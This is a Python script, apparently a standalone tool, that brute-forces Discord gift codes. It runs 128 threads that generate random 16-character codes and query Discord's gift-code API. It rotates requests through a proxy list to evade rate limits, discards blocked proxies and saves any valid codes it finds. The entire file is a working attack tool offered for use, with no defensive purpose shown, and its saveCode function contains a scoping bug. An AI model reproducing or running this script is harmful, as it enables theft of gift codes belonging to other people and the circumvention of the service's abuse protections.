import random
import string
import requests
import threading
import sys
import os, os.path
import time
from requests.exceptions import ProxyError, SSLError, ConnectionError, InvalidProxyURL

cpu_cores = 128
timeout = 5;
start_time = time.time()
os.environ["_THREADS"] = "0"
threads = []
proxies = []
invalid_proxies = 0
codes_tried = 0
codes_found = 0


def generateCode():
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(16))


def initProxyList():
    global proxies
    proxies = [line.rstrip('\n') for line in open('proxies/proxies.txt')]
    # remove duplicates
    proxies = list(set(proxies))
    f = open('proxies/proxies.txt', 'w+')
    to_write = ''
    for proxy in proxies:
        to_write += proxy + '\n'
    to_write = to_write[:-1]
    f.write(to_write)
    f.close()
 

def getProxy():
    global proxies
    return random.choice(proxies)


def flagInvalidProxy(proxy):
    global proxies, invalid_proxies
    if proxies.__contains__(proxy):
        proxies.remove(proxy)
        invalid_proxies = invalid_proxies + 1
    else:
        pass
    
    # delete from file too
    with open("proxies/proxies.txt", "r+") as f:
        data = f.readlines()
        f.seek(0)
        for i in data:
            if i != proxy + "\n":
                f.write(i)
        f.truncate()
    
    # save 4 later tho, rate limit might expire
    file = open("proxies/flagged_proxies.txt", "a")
    file.write(proxy + "\n")
    file.close()
    
def saveCode(code):
    file = open("codes_found.txt", "a")
    file.write(code + "\n")
    codes_found = codes_found + 1
    file.close()


def writeLog(text):
    file = open("log.txt", "a")
    file.write("################################################################################################\n")
    file.write("Tried: " + str(codes_tried) + " | Found: " + str(codes_found) + " | Proxies: " + str(len(proxies)) + " | Invalid: " + str(invalid_proxies) + "\n")
    file.write(text + "\n")
    file.close()


class bruteforceThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.tasks = []
    def run(self):
        global invalid_proxies, codes_tried, codes_found
        raw_proxy = ""
        while True:
            try:
                current_code = generateCode()

                url = 'https://discordapp.com/api/v6/entitlements/gift-codes/' + current_code + '?with_application=false&with_subscription_plan=true'
                raw_proxy = getProxy()
                proxy = {'https': 'https://' + raw_proxy}

                s = requests.session()
                response = s.get(url, proxies=proxy, timeout=timeout, headers={'Connection':'close'})
                s.close()
                log_msg = "Used proxy: " + raw_proxy + "\n" + "Used code: " + current_code + "\n\n>>>>>>>>>> " + response.text.replace("\n", "\n>>>>>>>>>> ")
                writeLog(log_msg)
                if 'subscription_plan' in response.text:
                    saveCode(current_code)
                elif 'Access denied' in response.text:# or 'rate limited' in response.text:
                    flagInvalidProxy(raw_proxy)
                else:
                    codes_tried += 1
                    #time.sleep(random.uniform(0.05, 0.5))
            except ProxyError:
                pass
            except SSLError:
                #flagInvalidProxy(raw_proxy)
                pass
            except ConnectionError:
                #flagInvalidProxy(raw_proxy)
                pass
            except InvalidProxyURL:
                #flagInvalidProxy(raw_proxy)
                pass
            else:
                pass


initProxyList()

for x in range(cpu_cores):
    threads.append(bruteforceThread())

for thread in threads:
    thread.daemon = True
    thread.start()
    thr = int(os.environ["_THREADS"])
    os.environ["_THREADS"] = str(thr + 1)

while True:
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        info = ""
        info += "Threads active: " + os.environ["_THREADS"]
        info += "\nAttempts: " + str(codes_tried) + " (" + str(round(codes_tried / (time.time() - start_time), 3)) + " / s)"
        info += "\nProxies: " + str(len(proxies))
        info += "\nInvalid proxies: " + str(invalid_proxies)
        info += "\nCodes Found: " + str(codes_found)
        print(info)
        time.sleep(0.5)
    except KeyboardInterrupt:
        exit(0)